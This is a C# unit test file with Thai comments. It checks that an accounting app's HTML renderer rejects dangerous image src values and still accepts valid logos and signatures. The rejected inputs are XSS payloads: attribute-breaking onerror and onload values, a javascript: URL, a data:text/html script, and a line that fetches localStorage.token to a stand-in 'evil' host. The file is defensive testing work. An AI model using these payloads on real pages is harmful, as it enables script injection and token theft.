using Accounting.Helpers;
using Xunit;

namespace Accounting.Tests;

/// <summary>รอบ 200 ทีม R · G2-02 (P0) — src ของ &lt;img&gt; ใน HTML renderer ต้องผ่านตัวตัดสินเดียว
/// สองทิศ: ค่าโจมตีต้องไม่ผ่าน (ทิศที่พัง) · โลโก้/ตรา/ลายเซ็นที่ถูกต้องต้องยังพิมพ์ได้ (ทิศที่ห้ามแตะ)</summary>
public class HtmlImageSourceTests
{
    [Theory]
    [InlineData("x' onerror='fetch(\"//evil/\"+localStorage.token)")]
    [InlineData("javascript:alert(1)")]
    [InlineData("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")]
    [InlineData("data:image/png;base64,AAAA' onerror='alert(1)")]
    [InlineData("//evil.example/logo.png")]
    [InlineData("https://cdn.example/logo.png' onload='x")]
    [InlineData("logo.png")]
    [InlineData("")]
    [InlineData(null)]
    public void ค่าที่แตก_attribute_หรือ_scheme_อันตราย_ไม่ผ่าน(string? src)
    {
        Assert.False(HtmlImageSource.IsAllowed(src));
        Assert.Null(HtmlImageSource.Attribute(src));
    }

    [Theory]
    [InlineData("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")]
    [InlineData("data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ==")]
    [InlineData("data:image/svg+xml;base64,PHN2Zy8+")]
    [InlineData("/uploads/logos/company-1.png")]
    [InlineData("https://cdn.example.com/brand/logo.png?v=2&size=200")]
    public void โลโก้_ตรา_ลายเซ็นที่ถูกต้อง_ยังพิมพ์ได้(string src)
    {
        Assert.True(HtmlImageSource.IsAllowed(src));
        var attr = HtmlImageSource.Attribute(src);
        Assert.NotNull(attr);
        Assert.DoesNotContain("'", attr);
        Assert.DoesNotContain("<", attr);
    }

    [Fact]
    public void ค่าที่ผ่าน_ถูก_encode_สำหรับ_attribute()
    {
        // & ใน query string ต้องเป็น &amp; ใน attribute — ไม่ใช่ปล่อยดิบ
        Assert.Equal("https://cdn.example.com/a.png?v=2&amp;s=1",
            HtmlImageSource.Attribute("https://cdn.example.com/a.png?v=2&s=1"));
    }
}
